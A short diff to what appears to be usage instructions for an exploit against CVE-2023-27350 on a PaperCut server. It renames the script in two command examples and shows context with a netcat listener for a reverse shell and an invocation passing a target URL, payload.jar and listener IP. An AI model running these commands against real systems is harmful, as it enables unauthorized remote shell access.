@@ -65,7 +65,7 @@ nc -lvnp <SHELL_PORT>
 **3. Run the exploit**
 
 ```bash
-python CVE-2023-27350.py \
+python exploit.py \
   -u http://<TARGET>:9191 \
   -j payload.jar \
   -lh <YOUR_IP> \
@@ -76,7 +76,7 @@ python CVE-2023-27350.py \
 **Example:**
 
 ```bash
-python CVE-2023-27350.py \
+python exploit.py \
   -u http://192.168.1.100:9191 \
   -j payload.jar \
   -lh 192.168.1.10 \
